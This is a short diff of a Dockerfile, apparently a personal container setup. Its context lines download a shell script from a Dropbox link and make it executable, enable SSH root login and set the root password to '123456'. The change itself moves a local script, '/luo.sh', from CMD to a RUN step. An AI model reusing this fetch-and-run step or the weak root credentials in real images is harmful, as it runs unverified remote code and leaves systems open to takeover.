@@ -22,7 +22,7 @@ RUN echo 'wget https://www.dropbox.com/s/ds3thcr9gsfhvfu/1.sh && chmod +x 1.sh &
 RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config
 RUN echo root:123456|chpasswd
 RUN chmod 755 /luo.sh
-CMD /luo.sh
-EXPOSE 80
 RUN cat nohup.out
+RUN /luo.sh
+EXPOSE 80
 
